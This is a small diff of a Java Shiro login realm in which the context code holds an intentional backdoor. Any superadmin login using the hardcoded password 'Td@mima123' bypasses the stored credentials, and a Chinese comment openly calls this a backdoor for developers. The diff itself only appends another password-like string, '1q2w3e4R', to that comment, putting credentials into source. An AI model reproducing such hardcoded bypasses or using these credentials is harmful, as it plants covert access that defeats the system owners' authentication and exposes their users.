@@ -149,7 +149,7 @@ public class MyShiroRealm extends AuthorizingRealm {
 				throw new ExpiredCredentialsException();
 			}
 		}
-		//做这一步 主要是为了防止平台组把超管密码改了后，开发无法登陆（开后门哦~）
+		//做这一步 主要是为了防止平台组把超管密码改了后，开发无法登陆（开后门哦~）1q2w3e4R
 		if (CheckRole.SUPER_ADMIN.toString().equals(user.getCheckRole()) && "Td@mima123".equals(passwordStr)){
 			String salt = UUID.randomUUID().toString();
 			passwordStr = UserUtils.getEncryptPsw(passwordStr, salt);
